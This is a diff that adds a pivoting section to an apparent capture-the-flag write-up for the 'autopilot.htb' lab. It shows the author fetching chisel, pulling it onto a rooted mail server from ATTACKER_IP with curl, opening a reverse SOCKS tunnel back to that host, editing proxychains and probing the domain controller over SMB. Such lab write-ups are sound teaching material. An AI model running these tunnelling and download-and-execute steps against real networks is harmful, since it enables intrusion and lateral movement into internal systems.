@@ -1144,6 +1144,75 @@ With root on the Linux host, read the user flag:
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 5.6 Pivot into the internal AD network
+
+Root on the mail server is the key ring for the Windows domain behind it. The box is dual-homed and sits on the internal AD subnet, so it becomes the gateway for reaching the domain controller.
+
+#### 5.6.1 See the second network
+
+```bash
+ip a; ip route
+```
+
+```text
+2: eth0 ... inet 172.16.20.10/24 ...
+default via 172.16.20.1 dev eth0
+172.16.20.0/24 dev eth0 proto kernel scope link src 172.16.20.10
+```
+
+The grommunio host is `172.16.20.10`; the default gateway `172.16.20.1` is the domain controller `DC01`. This subnet is not routable from the attacker directly, so a tunnel is required. (A second workstation, `WS02`, also lives on this subnet and matters later.)
+
+#### 5.6.2 Build a reverse SOCKS tunnel with chisel
+
+```bash
+# Attacker (Kali): fetch chisel, run the reverse server, serve the binary for transfer
+wget -q https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz -O - | gunzip > chisel && chmod +x chisel
+./chisel server -p 9000 --reverse &
+python3 -m http.server 8000      # reuse if one is already running
+
+# Target (grommunio root shell): pull the same binary and connect back as a reverse SOCKS client
+curl http://ATTACKER_IP:8000/chisel -o /tmp/chisel && chmod +x /tmp/chisel
+/tmp/chisel client ATTACKER_IP:9000 R:socks &
+```
+
+The client reports `Connected`, and the server shows `session#1: ... R:127.0.0.1:1080 => socks: Listening`. A SOCKS5 proxy is now live on the attacker at `127.0.0.1:1080`, routing into `172.16.20.0/24`.
+
+#### 5.6.3 Point proxychains at the tunnel (and a config gotcha)
+
+```bash
+# ensure the ONLY active proxy in [ProxyList] is the chisel SOCKS port
+sudo sed -i -E 's/^(socks[45]\s+127\.0\.0\.1\s+9050)/#\1/' /etc/proxychains4.conf   # comment the default Tor line
+echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf
+tail -n 3 /etc/proxychains4.conf
+```
+
+Gotcha: proxychains ships in `strict_chain` mode with a default `socks4 127.0.0.1 9050` (Tor) entry. If that line is left active, every request is chained through the dead 9050 proxy first and times out (`127.0.0.1:9050 ... timeout`). Comment it so only the chisel `socks5 127.0.0.1 1080` entry remains.
+
+#### 5.6.4 Sanity check through the tunnel
+
+```bash
+proxychains netexec smb 172.16.20.1
+```
+
+```text
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:445  ...  OK
+SMB  172.16.20.1  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:autopilot.htb) (signing:True) (SMBv1:None)
+```
+
+**What this gives you:**
+
+- A working SOCKS tunnel from the attacker into the internal AD network via the rooted mail server.
+- Confirmation of the domain controller: `DC01` / `autopilot.htb`, Windows Server 2025 (build 26100), SMB signing enforced. All AD tooling now runs through `proxychains`.
+
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
